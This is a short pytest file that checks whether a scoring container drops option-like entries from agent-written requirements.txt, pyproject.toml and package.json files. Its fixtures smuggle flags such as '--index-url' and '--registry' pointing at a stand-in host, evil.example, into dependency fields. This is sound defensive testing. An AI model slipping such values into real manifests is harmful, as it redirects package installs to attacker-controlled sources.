"""The scoring container must not let agent-written manifest values become command-line options."""

from __future__ import annotations

import importlib.util
import json
from pathlib import Path

_spec = importlib.util.spec_from_file_location(
    "score_in_container", Path(__file__).parent.parent / "docker" / "score_in_container.py")
sic = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(sic)


def test_option_like_requirements_and_packages_are_dropped(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("--index-url=http://evil.example\nrequests>=2\n")
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "x"\ndependencies = ["--extra-index-url=http://evil.example", "httpx"]\n')
    (tmp_path / "package.json").write_text(json.dumps({"dependencies": {
        "--registry=http://evil.example": "^1.0.0", "left-pad": "--foo", "express": "^4.18.0"}}))
    assert sic._python_requirements(tmp_path) == [("requirements.txt", "requests>=2"),
                                                  ("pyproject.toml", "httpx")]
    assert sic._npm_dependencies(tmp_path) == [("express", "^4.18.0")]
